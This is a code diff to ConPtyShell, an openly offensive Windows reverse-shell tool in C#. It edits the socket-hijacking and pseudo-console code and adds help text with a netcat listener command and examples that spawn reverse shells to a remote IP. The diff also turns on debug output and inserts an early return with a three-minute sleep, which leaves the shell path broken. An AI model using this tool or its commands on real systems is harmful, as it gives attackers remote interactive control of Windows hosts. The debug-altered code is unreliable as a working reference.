@@ -600,7 +600,7 @@ public static class SocketHijacking
                 closesocket(sock);
                 continue;
             }
-            // Console.WriteLine("debug: Socket handle 0x" + sock.ToString("X4") + " is in tcpstate " + sockInfo.State.ToString());
+            Console.WriteLine("debug: Socket handle 0x" + sock.ToString("X4") + " is in tcpstate " + sockInfo.State.ToString());
             // we need only active sockets, the remaing sockets are filtered out
             if (sockInfo.State == TcpState.SynReceived || sockInfo.State == TcpState.Established)
             {
@@ -619,7 +619,7 @@ public static class SocketHijacking
         foreach (SOCKET_BYTESIN sockBytesIn in socketsBytesIn)
         {
             socketsOut.Add(sockBytesIn.handle);
-            // Console.WriteLine("debug: Socket handle 0x" + sockBytesIn.handle.ToString("X4") + " total bytes received: " + sockBytesIn.BytesIn.ToString());
+            Console.WriteLine("debug: Socket handle 0x" + sockBytesIn.handle.ToString("X4") + " total bytes received: " + sockBytesIn.BytesIn.ToString());
         }
         return socketsOut;
     }
@@ -634,7 +634,7 @@ public static class SocketHijacking
         result = WSAIoctl1(socket, SIO_TCP_INFO, ref tcpInfoVersion, Marshal.SizeOf(tcpInfoVersion), tcpInfoPtr, tcpInfoSize, ref bytesReturned, IntPtr.Zero, IntPtr.Zero);
         if (result != 0)
         {
-            // Console.WriteLine("debug: WSAIoctl1 failed with return code " + result.ToString() + " and wsalasterror: " + WSAGetLastError().ToString());
+            Console.WriteLine("debug: WSAIoctl1 failed with return code " + result.ToString() + " and wsalasterror: " + WSAGetLastError().ToString());
             tcpInfoOut = new TCP_INFO_v0();
             return false;
         }
@@ -736,7 +736,7 @@ public static class SocketHijacking
             {
                 if (deadlockCheckHelperObj.CheckDeadlockDetected(dupHandle))
                 { // this will avoids deadlocks on special named pipe handles
-                    // Console.WriteLine("debug: Deadlock detected");
+                    Console.WriteLine("debug: Deadlock detected");
                     CloseHandle(dupHandle);
                     continue;
                 }
@@ -758,7 +758,7 @@ public static class SocketHijacking
                 if (objNameInfo.Name.Buffer != IntPtr.Zero && objNameInfo.Name.Length > 0)
                 {
                     strObjectName = Marshal.PtrToStringUni(objNameInfo.Name.Buffer, objNameInfo.Name.Length / 2);
-                    // Console.WriteLine("debug: file handle 0x" + dupHandle.ToString("X4") + " strObjectName = " + strObjectName);
+                    Console.WriteLine("debug: file handle 0x" + dupHandle.ToString("X4") + " strObjectName = " + strObjectName);
                     if (strObjectName == "\\Device\\Afd")
                         socketsHandles.Add(dupHandle);
                     else
@@ -796,8 +796,11 @@ public static class SocketHijacking
                 (sockaddrTargetProcess.sin_addr == sockaddrParentProcess.sin_addr && sockaddrTargetProcess.sin_port == sockaddrParentProcess.sin_port)
                )
             {
-                // Console.WriteLine("debug: found inherited socket! handle --> 0x" + parentSocketHandle.ToString("X4"));
+                Console.WriteLine("debug: found inherited socket! handle --> 0x" + parentSocketHandle.ToString("X4"));
                 inherited = true;
+            }
+            else {
+                Console.WriteLine("debug: socket handle not inherited, skipping... handle --> 0x" + socketHandle.ToString("X4"));
             }
             closesocket(parentSocketHandle);
         }
@@ -847,7 +850,7 @@ public static class SocketHijacking
                 // we prioritize the hijacking of Overlapped sockets
                 if (!IsSocketOverlapped(socketHandle))
                 {
-                    // Console.WriteLine("debug: Found a usable socket, but it has not been created with the flag WSA_FLAG_OVERLAPPED, skipping...");
+                    Console.WriteLine("debug: Found a usable socket, but it has not been created with the flag WSA_FLAG_OVERLAPPED, skipping...");
                     continue;
                 }
                 targetSocketHandle = socketHandle;
@@ -856,7 +859,7 @@ public static class SocketHijacking
             }
             // no Overlapped sockets found, expanding the scope by including also Non-Overlapped sockets
             if (targetSocketHandle == IntPtr.Zero) {
-                // Console.WriteLine("debug: No overlapped sockets found. Trying to return also non-overlapped sockets...");
+                Console.WriteLine("debug: No overlapped sockets found. Trying to return also non-overlapped sockets...");
                 foreach (IntPtr socketHandle in targetProcessSockets)
                 {
                     targetSocketHandle = socketHandle;
@@ -1468,7 +1471,7 @@ public static class ConPtyShell
         PROCESS_INFORMATION childProcessInfo = new PROCESS_INFORMATION();
         CreatePipes(ref InputPipeRead, ref InputPipeWrite, ref OutputPipeRead, ref OutputPipeWrite);
         // comment the below function to debug errors
-        InitConsole(ref oldStdIn, ref oldStdOut, ref oldStdErr);
+        // InitConsole(ref oldStdIn, ref oldStdOut, ref oldStdErr);
         // init wsastartup stuff for this thread
         InitWSAThread();
         if (conptyCompatible)
@@ -1530,9 +1533,9 @@ public static class ConPtyShell
                 newConsoleAllocated = true;
             }
             // debug code for checking handle duplication
-            // Console.WriteLine("debug: Creating pseudo console...");
-            // Thread.Sleep(180000);
-            // return "";
+            Console.WriteLine("debug: Creating pseudo console...");
+            Thread.Sleep(180000);
+            return "";
             int pseudoConsoleCreationResult = CreatePseudoConsoleWithPipes(ref handlePseudoConsole, ref InputPipeRead, ref OutputPipeWrite, rows, cols);
             if (pseudoConsoleCreationResult != 0)
             {
@@ -1609,7 +1612,56 @@ public static class ConPtyShell
 
 public static class ConPtyShellMainClass
 {
-    private static string help = @"";
+    private static string help = @"
+
+ConPtyShell - Fully Interactive Reverse Shell for Windows 
+Author: splinter_code
+License: MIT
+Source: https://github.com/antonioCoco/ConPtyShell
+    
+ConPtyShell - Fully interactive reverse shell for Windows
+
+Properly set the rows and cols values. You can retrieve it from
+your terminal with the command ""stty size"".
+
+You can avoid to set rows and cols values if you run your listener
+with the following command:
+    stty raw -echo; (stty size; cat) | nc -lvnp 3001
+
+If you want to change the console size directly from powershell
+you can paste the following commands:
+    $width=80
+    $height=24
+    $Host.UI.RawUI.BufferSize = New-Object Management.Automation.Host.Size ($width, $height)
+    $Host.UI.RawUI.WindowSize = New-Object -TypeName System.Management.Automation.Host.Size -ArgumentList ($width, $height)
+
+Usage:
+    ConPtyShell.exe remote_ip remote_port [rows] [cols] [commandline]
+
+Positional arguments:
+    remote_ip               The remote ip to connect
+    remote_port             The remote port to connect
+    [rows]                  Rows size for the console
+                            Default: ""24""
+    [cols]                  Cols size for the console
+                            Default: ""80""
+    [commandline]           The commandline of the process that you are going to interact
+                            Default: ""powershell.exe""
+                            
+Examples:
+    Spawn a reverse shell
+        ConPtyShell.exe 10.0.0.2 3001
+    
+    Spawn a reverse shell with specific rows and cols size
+        ConPtyShell.exe 10.0.0.2 3001 30 90
+    
+    Spawn a reverse shell (cmd.exe) with specific rows and cols size
+        ConPtyShell.exe 10.0.0.2 3001 30 90 cmd.exe
+        
+    Upgrade your current shell with specific rows and cols size
+        ConPtyShell.exe upgrade shell 30 90
+        
+";
 
     private static bool HelpRequired(string param)
     {
